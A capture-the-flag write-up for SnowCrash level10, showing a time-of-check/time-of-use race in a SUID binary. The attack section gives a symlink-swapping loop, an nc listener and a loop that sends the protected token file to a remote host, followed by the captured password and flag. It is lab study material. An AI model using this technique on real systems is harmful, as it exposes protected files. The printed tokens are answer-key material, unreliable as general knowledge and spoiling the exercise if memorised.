# Level 10 - Race Condition Exploit

This level demonstrates a **race condition** vulnerability via symbolic links and poor file permission handling.

---

## Step 1: Inspect the Binary

```bash
ls -la
...
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

level10 is SUID and runs with flag10's privileges.
There is a token file only accessible to flag10.

Step 2: Test Program Behavior

```bash
./level10
./level10 file host
sends file to host if you have access to it
```

The program requires a file and a host as arguments.
Step 3: Decompile the Binary

Decompiled code shows:

int32_t main(int argc, char\** argv)
{
// Check if arguments are provided
if (argc <= 2)
{
printf("%s file host\n\tsends file to host if you have access to it\n", *argv);
exit(1);
}

    // Check access to the file
    if (access(argv[1], 4))
    {
        printf("You don't have access to %s\n", argv[1]);
        exit(1);
    }

    // Connect to the host and send the file
    // ...

}

The program checks access to the file using access() and then connects to a server at port 6969 to send the file.
Step 4: Exploit the Race Condition

We create three terminals:

Server Terminal: Start a server using nc on port 6969.

```bash
nc -lk 6969
```

Symbolic Link Loop Terminal: Create a loop that will create and remove a symbolic link to a file that we own.

```bash
while true; do ln -fs /tmp/empty /tmp/link2; ln -fs /home/user/level10/token /tmp/link2; done
```

Binary Execution Terminal: Execute the binary in a loop.

```bash
    while true; do ./level10 /tmp/link2 192.168.1.78; done
```

Step 5: Result

On the server terminal, we get:

```bash
._( )_.
._( )_.
._( )_.
woupa2yuojeeaaed06riuj63c
._( )_.
._( )_.
._( )_.
._( )_.
._( )_.
woupa2yuojeeaaed06riuj63c
._( )_.
._( )_.
```

We can now use the token to get the flag:

```bash
su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~\$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

✅ Summary

    Race Condition: The symbolic link allowed us to exploit the race condition between the access() check and the actual file access.
    The level10 binary failed to securely handle the race condition.
    This exposed a restricted file by circumventing the access validation.
